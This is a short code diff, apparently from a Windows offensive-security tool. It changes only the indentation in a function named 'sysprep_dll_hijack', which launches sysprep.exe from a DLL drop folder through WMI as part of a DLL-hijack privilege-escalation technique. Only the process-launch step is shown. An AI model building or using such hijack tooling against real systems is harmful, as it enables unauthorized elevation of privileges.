@@ -53,7 +53,7 @@ def sysprep_dll_hijack():
 		print " {} sysprep_dll_hijack: Attempting to create process".format(infoBox())
 		try:
 			result = wmi.Win32_Process.Create(CommandLine="{}".format(os.path.join(dll_drop,"sysprep.exe")),
-											ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
+							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
 			if (result[1] == 0):
 				print " {} sysprep_dll_hijack: Process started successfully".format(successBox())
 			else:
